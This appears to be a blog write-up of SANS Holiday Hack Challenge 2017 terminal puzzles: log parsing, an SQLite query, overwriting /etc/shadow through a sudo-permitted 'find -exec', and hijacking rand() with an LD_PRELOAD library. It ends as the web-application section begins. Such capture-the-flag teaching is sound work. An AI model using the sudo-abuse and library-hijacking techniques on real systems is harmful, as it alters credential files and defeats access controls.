               _.<span class="p">;</span>_ <span class="sb">`</span><span class="nt">--</span><span class="s1">' `\    \ |.'</span><span class="sb">`</span><span class="se">\.</span>_,##<span class="s1">'`
              /.-.\ `\     |.-";.`_, |##'</span><span class="sb">`</span>
              |<span class="se">\_</span>_/   | _..<span class="p">;</span>__  |<span class="s1">'-'</span> /
              <span class="s1">'.____.'</span>_.-<span class="sb">`</span><span class="o">)</span><span class="se">\-</span>-<span class="s1">' /'</span>-<span class="s1">'`
               //||\\(_.-'</span>_,<span class="s1">'-'</span><span class="sb">`</span>
             <span class="o">(</span><span class="sb">`</span>-...-<span class="s1">')_,##'</span><span class="sb">`</span>
      jgs _,##<span class="sb">`</span>-..,-<span class="p">;</span><span class="c">##`</span>
       _,##<span class="s1">'`-._,##'</span><span class="sb">`</span>
    _,##<span class="s1">'`-._,##'</span><span class="sb">`</span>
      <span class="sb">`</span>-._,##<span class="s1">'`
My name is Pepper Minstix, and I need your help with my plight.
I'</span>ve crashed the Christmas toy train, <span class="k">for </span>which I am quite contrite.
I should not have interfered, hacking it was foolish <span class="k">in </span>hindsight.
If you can get it running again, I will reward you with a gift of delight.
total 444
<span class="nt">-rwxr-xr-x</span> 1 root root 454636 Dec  7 18:43 trainstartup
</pre></table></code></div></div><p>We are prompted to run a binary. Let’s see which architecture this binary is:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>elf@f533c87441b9:~<span class="nv">$ </span>file trainstartup 
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 <span class="o">(</span>GNU/Linux<span class="o">)</span>, statically linked, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>005de4685e8563d10b3de3
e0be7d6fdd7ed732eb, not stripped
</pre></table></code></div></div><p>So this is an ARM binary. There is <code class="language-plaintext highlighter-rouge">qemu-arm</code> on the machine. Just gotta use it</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>elf@f533c87441b9:~<span class="nv">$ </span>qemu-arm ./trainstartup

    Merry Christmas
    Merry Christmas
v
<span class="o">&gt;</span><span class="k">*</span>&lt;
^
/o<span class="se">\</span>
/   <span class="se">\ </span>              @.·
/~~   <span class="se">\ </span>               <span class="nb">.</span>
/ ° ~~  <span class="se">\ </span>        · <span class="nb">.</span>    
/      ~~ <span class="se">\ </span>      ◆  ·    
/     °   ~~<span class="se">\ </span>   ·     0
/~~           <span class="se">\ </span>  .─··─ · o
             /°  ~~  .<span class="k">*</span>· · <span class="nb">.</span> <span class="se">\ </span> ├──┼──┤                                        
              │  ──┬─°─┬─°─°─°─ └──┴──┘                                        
≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>──┼──<span class="o">=</span>≠     ≠<span class="o">=</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">===</span>≠
              │   /└───┘<span class="se">\┌</span>───┐       ┌┐                                        
                         └───┘    /▒▒▒▒                                        
≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">=</span>°≠<span class="o">=</span>°≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠<span class="o">==</span>≠
You did it! Thank you!
</pre></table></code></div></div><h3 id="blumbles-bounce">BLUMBLES BOUNCE</h3><h4 id="web-log">Web Log</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>                           ._    _.
                           <span class="o">(</span>_<span class="o">)</span>  <span class="o">(</span>_<span class="o">)</span>                  &lt;<span class="o">&gt;</span> <span class="se">\ </span> / &lt;<span class="o">&gt;</span>
                            .<span class="se">\:</span>:/.                   <span class="se">\_\/</span>  <span class="se">\/</span>_/ 
           .:.          _.<span class="o">=</span>._<span class="se">\\</span>//_.<span class="o">=</span>._                  <span class="se">\\</span>//
      ..   <span class="se">\o</span>/   ..      <span class="s1">'='</span> //<span class="se">\\</span> <span class="s1">'='</span>             _&lt;<span class="o">&gt;</span>_<span class="se">\_\&lt;</span><span class="o">&gt;</span>/_/_&lt;<span class="o">&gt;</span>_
      :o|   |   |o:         <span class="s1">'/::\'</span>                 &lt;<span class="o">&gt;</span> / /&lt;<span class="o">&gt;</span><span class="se">\ \ </span>&lt;<span class="o">&gt;</span>
       ~ <span class="s1">'. '</span> .<span class="s1">' ~         (_)  (_)      _    _       _ //\\ _
           &gt;O&lt;             '</span>      <span class="s1">'     /_/  \_\     / /\  /\ \
       _ .'</span> <span class="nb">.</span> <span class="s1">'. _                        \\//       &lt;&gt; /  \ &lt;&gt;
      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
      ''   /o\   ''     '</span>.|  |.<span class="s1">'      \/ //&gt;&lt;\\ \/
           '</span>:<span class="s1">'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / '</span> /<span class="se">\ </span><span class="s1">' \                   \o/
       o              '</span> __/  <span class="se">\_</span>_ <span class="s1">'              _o/.:|:.\o_
  o    :    o         '</span> .<span class="s1">'|  |'</span><span class="nb">.</span>                  .<span class="se">\:</span>|:/.
    <span class="s1">'.\'</span>/.<span class="s1">'                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
    :-&gt;@&lt;-:                 :                   _ '</span>/:|:<span class="se">\'</span> _
    .<span class="s1">'/.\'</span><span class="nb">.</span>           <span class="s1">'.___/*\___.'</span>              o<span class="se">\'</span>:|:<span class="s1">'/o 
  o    :    o           \* \ / */                   /o\
       o                 &gt;--X--&lt;
                        /*_/ \_*\
                      .'</span>   <span class="se">\*</span>/   <span class="s1">'.
                            :
                            '</span>
Minty Candycane here, I need your <span class="nb">help </span>straight away.
We<span class="s1">'re having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
</span></pre></table></code></div></div><p>One-liner:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cat </span>access.log | <span class="nb">grep </span>GET | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'"'</span> <span class="nt">-f</span> 6 | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="nt">-c</span>  | <span class="nb">sort</span> | <span class="nb">head</span> <span class="nt">-n</span> 1
</pre></table></code></div></div><p>Result:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>elf@474bcdbda1dd:~<span class="nv">$ </span>./runtoanswer 
Starting up, please wait......
Enter the name of the least popular browser <span class="k">in </span>the web log: Dillo/3.0.5
That is the least common browser <span class="k">in </span>the web log! Congratulations!
</pre></table></code></div></div><h3 id="i-dont-think-were-in-kansas-anymore">I DON’T THINK WE’RE IN KANSAS ANYMORE</h3><h4 id="christmas-songs-data-analysis">Christmas Songs data analysis</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>                       <span class="k">*</span>
                      .~<span class="s1">'
                     O'</span>~..
                    ~<span class="s1">'O'</span>~..
                   ~<span class="s1">'O'</span>~..~<span class="s1">'
                  O'</span>~..~<span class="s1">'O'</span>~.
                 .~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~
                ..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~.
               .~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'
              O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..
             ~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..
            ~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'
           O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~.
          .~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~
         ..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~.
        .~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'
       O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..
      ~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..
     ~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'
    O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~.
   .~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~
  ..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~.
 .~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'
O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..~<span class="s1">'O'</span>~..
Sugarplum Mary is <span class="k">in </span>a tizzy, we hope you can assist.
Christmas songs abound, with many likes <span class="k">in </span>our midst.
The database is populated, ready <span class="k">for </span>you to address.
Identify the song whose popularity is the best.
total 20684
<span class="nt">-rw-r--r--</span> 1 root root 15982592 Nov 29 19:28 christmassongs.db
<span class="nt">-rwxr-xr-x</span> 1 root root  5197352 Dec  7 15:10 runtoanswer
</pre></table></code></div></div><p>To get the ID of the most popular song, I need to count the number of likes for each unique ID and then sort them in descending order. One way to do this is:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="n">songid</span><span class="p">)</span> <span class="k">count</span><span class="p">,</span> <span class="n">songid</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">group</span> <span class="k">by</span> <span class="n">songid</span> <span class="k">order</span> <span class="k">by</span> <span class="k">count</span> <span class="k">desc</span> <span class="k">limit</span> <span class="mi">10</span><span class="p">;</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>sqlite&gt; <span class="k">select </span>count<span class="o">(</span>songid<span class="o">)</span> count, songid from likes group by songid order by count desc limit 10<span class="p">;</span>
11325|392
2162|245
2140|265
2132|207
2129|98
2126|90
2122|33
2120|130
2117|18
2117|446
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>sqlite&gt; <span class="k">select</span> <span class="k">*</span> from songs where <span class="nb">id</span> <span class="o">=</span> 392<span class="p">;</span>
392|Stairway to Heaven|Led Zeppelin|1971|<span class="s2">"Stairway to Heaven"</span> is a song by the English rock band Led Zeppelin, released <span class="k">in </span>late 1971. It was composed by guitarist Jimmy Page and vocalist Robert Plant <span class="k">for </span>the band<span class="s1">'s untitled fourth studio album (often called Led Zeppelin IV). It is often referred to as one of the greatest rock songs of all time.

sqlite&gt; .shell ./runtoanswer 
Starting up, please wait......
Enter the name of the song with the most likes: Stairway to Heaven
That is the #1 Christmas song, congratulations!
</span></pre></table></code></div></div><h3 id="oh-wait-maybe-we-are">OH WAIT! MAYBE WE ARE…</h3><h4 id="shadow-file-restoration">Shadow File Restoration</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>              <span class="se">\ </span>/
            <span class="nt">--</span><span class="o">&gt;</span><span class="k">*</span>&lt;<span class="nt">--</span>
              /o<span class="se">\</span>
             /_<span class="se">\_\</span>
            /_/_0_<span class="se">\</span>
           /_o_<span class="se">\_\_\</span>
          /_/_/_/_/o<span class="se">\</span>
         /@<span class="se">\_\_\@\_\_\</span>
        /_/_/O/_/_/_/_<span class="se">\</span>
       /_<span class="se">\_\_\_\_\o\_\_\</span>
      /_/0/_/_/_0_/_/@/_<span class="se">\</span>
     /_<span class="se">\_\_\_\_\_\_\_\_\_\</span>
    /_/o/_/_/@/_/_/o/_/0/_<span class="se">\</span>
   jgs       <span class="o">[</span>___]  
My name is Shinny Upatree, and I<span class="s1">'ve made a big mistake.
I fear it'</span>s worse than the <span class="nb">time </span>I served everyone bad hake.
I<span class="s1">'ve deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_b
ox" to complete this challenge.
Hint: What commands can you run with sudo?
</span></pre></table></code></div></div><p>Let’s see what commands can be run with sudo</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>elf@e4490931c153:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-ll</span>
Matching Defaults entries <span class="k">for </span>elf on e4490931c153:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
User elf may run the following commands on e4490931c153:
Sudoers entry:
    RunAsUsers: elf
    RunAsGroups: shadow
    Options: <span class="o">!</span>authenticate
    Commands:
        /usr/bin/find
</pre></table></code></div></div><p>Have been tinkering with <code class="language-plaintext highlighter-rouge">find</code> for a while, I know it can execute commands on the results using the <code class="language-plaintext highlighter-rouge">-exec</code> flag, but I wasn’t sure with what privileges it will execute the commands. These are the shadow files in <code class="language-plaintext highlighter-rouge">/etc</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>elf@72830e537580:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/shadow<span class="k">*</span>
<span class="nt">-rw-rw----</span> 1 root shadow   0 Dec 15 20:00 /etc/shadow
<span class="nt">-rw-------</span> 1 root root   652 Nov 14 13:48 /etc/shadow-
<span class="nt">-rw-r--r--</span> 1 root root   677 Dec 15 19:59 /etc/shadow.bak
</pre></table></code></div></div><p>The file we need to restore belongs to the <code class="language-plaintext highlighter-rouge">shadow</code> group and it has read+write group permission. My solution is to let <code class="language-plaintext highlighter-rouge">find</code> find this file (no pun intended) and then copy the backup shadow file over it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>elf@72830e537580:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-g</span> shadow find /etc/shadow <span class="nt">-exec</span> <span class="nb">cp</span> /etc/shadow.bak <span class="o">{}</span> <span class="se">\;</span>
elf@72830e537580:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/shadow<span class="k">*</span>
<span class="nt">-rw-rw----</span> 1 root shadow 677 Jan  6 10:23 /etc/shadow
<span class="nt">-rw-------</span> 1 root root   652 Nov 14 13:48 /etc/shadow-
<span class="nt">-rw-r--r--</span> 1 root root   677 Dec 15 19:59 /etc/shadow.bak
elf@72830e537580:~<span class="nv">$ </span>inspect_da_box 
                     ___
                    / __<span class="s1">'.     .-"""-.
              .-""-| |  '</span>.<span class="s1">'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'</span>._
           <span class="p">;</span> <span class="p">;</span>      <span class="sb">`</span>.-<span class="s2">" "</span>-:_,<span class="o">(</span>o:<span class="o">==</span>..<span class="sb">`</span>-. <span class="s1">'.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'</span>      <span class="se">\ </span> <span class="s1">'.`---'</span> /
     <span class="se">\ \ </span>  / /     |<span class="sb">`</span>        <span class="se">\'</span>   _...--.<span class="p">;</span>   <span class="s1">'---'</span><span class="sb">`</span>
      <span class="se">\ </span><span class="s1">'-'</span> / jgs  /_..---.._ <span class="se">\ </span>.<span class="s1">'\\_     `.
       `--'</span><span class="sb">`</span>      .<span class="s1">'    (_)  `'</span>/   <span class="o">(</span>_<span class="o">)</span>     /
                  <span class="sb">`</span>._       _.<span class="s1">'|         .'</span>
                     <span class="sb">```````</span>    <span class="s1">'-...--'</span><span class="sb">`</span>
/etc/shadow has been successfully restored!
</pre></table></code></div></div><h3 id="were-off-to-see-the">WE’RE OFF TO SEE THE…</h3><h4 id="ld_preload-hooking">LD_PRELOAD hooking</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>
                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _<span class="o">(</span>_      _Y_      _Y_      _Y_      _Y_      _<span class="o">)</span>_
              <span class="o">[</span>___]    <span class="o">[</span>___]    <span class="o">[</span>___]    <span class="o">[</span>___]    <span class="o">[</span>___]    <span class="o">[</span>___]
              /:<span class="s1">' \    /:'</span> <span class="se">\ </span>   /:<span class="s1">' \    /:'</span> <span class="se">\ </span>   /:<span class="s1">' \    /:'</span> <span class="se">\</span>
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             <span class="se">\:</span>:.  /  <span class="se">\:</span>:.  /  <span class="se">\:</span>:.  /  <span class="se">\:</span>:.  /  <span class="se">\:</span>:.  /  <span class="se">\:</span>:.  /
         jgs  <span class="se">\:</span>:./    <span class="se">\:</span>:./    <span class="se">\:</span>:./    <span class="se">\:</span>:./    <span class="se">\:</span>:./    <span class="se">\:</span>:./
               <span class="s1">'='</span>      <span class="s1">'='</span>      <span class="s1">'='</span>      <span class="s1">'='</span>      <span class="s1">'='</span>      <span class="s1">'='</span>
Wunorse Openslae has a special challenge <span class="k">for </span>you.
Run the given binary, make it <span class="k">return </span>42.
Use the partial <span class="nb">source </span><span class="k">for </span>hints, it is just a clue.
You will need to write your own code, but only a line or two.
total 88
<span class="nt">-rwxr-xr-x</span> 1 root root 84824 Dec 16 16:47 isit42
<span class="nt">-rw-r--r--</span> 1 root root   654 Dec 15 19:59 isit42.c.un
</pre></table></code></div></div><p>To produce the expected result when running the binary, we’ll need to make a shared object and specify it in the <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> environment variable. In this shared object, we can rewrite the <code class="language-plaintext highlighter-rouge">rand()</code> function used in the binary <code class="language-plaintext highlighter-rouge">isit42</code> so that it always return 42.</p><p><code class="language-plaintext highlighter-rouge">hijack.c</code>:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">rand</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">42</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Compile the above code to a shared object:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gcc <span class="nt">-o</span> libc.so.6 <span class="nt">-shared</span> <span class="nt">-fPIC</span> hijack.c
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>elf@419cb8f6de23:~<span class="nv">$ LD_PRELOAD</span><span class="o">=</span>./libc.so.6 ./isit42 
Starting up ... <span class="k">done</span><span class="nb">.</span>
Calling rand<span class="o">()</span> to <span class="k">select </span>a random number.
                 .-. 
                .<span class="p">;;</span><span class="se">\ </span><span class="o">||</span>           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
               /::::<span class="se">\|</span>/          |       <span class="o">||</span>  | |  <span class="o">||</span>       |  |   _   <span class="o">||</span>  |  | <span class="o">||</span>       <span class="o">||</span> | _ | <span class="o">||</span>       <span class="o">||</span>    _ |
              /::::<span class="s1">'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
         \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
          \/|(_) () (_)|\/ 
            \   '</span><span class="o">()</span><span class="s1">'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
        /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
       `.__/     ()     \__.'</span>      |   |  | <span class="o">||</span>   |___ |   _   <span class="o">||</span>       <span class="o">||</span>       |  |   |    |   |  _____| |
       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
       /  <span class="se">\|</span><span class="nt">---</span>|    |---|/  <span class="se">\ </span>
       |  <span class="o">(</span>|42 | <span class="o">()</span> | DA|<span class="o">)</span>  |       _   ___  _______ 
       <span class="se">\ </span> /<span class="p">;</span><span class="nt">---</span><span class="s1">'    '</span><span class="nt">---</span><span class="p">;</span><span class="se">\ </span> /      | | |   <span class="o">||</span>       |
        <span class="sb">``</span> <span class="se">\ </span>___ /<span class="se">\ </span>___ / <span class="sb">``</span>       | |_|   <span class="o">||</span>____   |
            <span class="sb">`</span>|  |  |  |<span class="sb">`</span>           |       | ____|  |
      jgs    |  |  |  |            |___    <span class="o">||</span> ______| ___ 
       _._  |<span class="se">\|\/</span><span class="o">||</span><span class="se">\/</span>|/|  _._          |   <span class="o">||</span> |_____ |   |
      / .-<span class="se">\ </span>|~~~~||~~~~| /-. <span class="se">\ </span>        |___||_______||___|
      | <span class="se">\_</span>_.<span class="s1">'    ||    '</span>.__/ |
       <span class="sb">`</span><span class="nt">---------</span><span class="s1">''</span><span class="nt">---------</span><span class="sb">`</span> 
Congratulations! You<span class="s1">'ve won, and have successfully completed this challenge.
</span></pre></table></code></div></div><p><a name="HHC17-GreatBook"></a></p><h2 id="finding-pages-of-the-great-book">Finding Pages of the Great Book</h2><p><em>1. Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?</em></p><p>This is done during the game. The title of the page is <strong>About This Book</strong>.</p><p><em>2. Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball’s password</em></p><p><em>For hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips.</em></p><p>tl;dr:</p><ul><li>The topic of the page is <code class="language-plaintext highlighter-rouge">On the topic of Flying Animals</code>.<li>The password is <code class="language-plaintext highlighter-rouge">stream_unhappy_buy_loss</code>.</ul><p>Visit the Lettes to Santa application and read the source code, I encountered an interesting hidden field on line 243</p><div class="language-php highlighter-rouge"><div class="code-header"> <span text-data=" PHP "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- Development version --&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://dev.northpolechristmastown.com"</span> <span class="na">style=</span><span class="s">"display: none;"</span><span class="nt">&gt;</span>Access Development Version<span class="nt">&lt;/a&gt;</span>
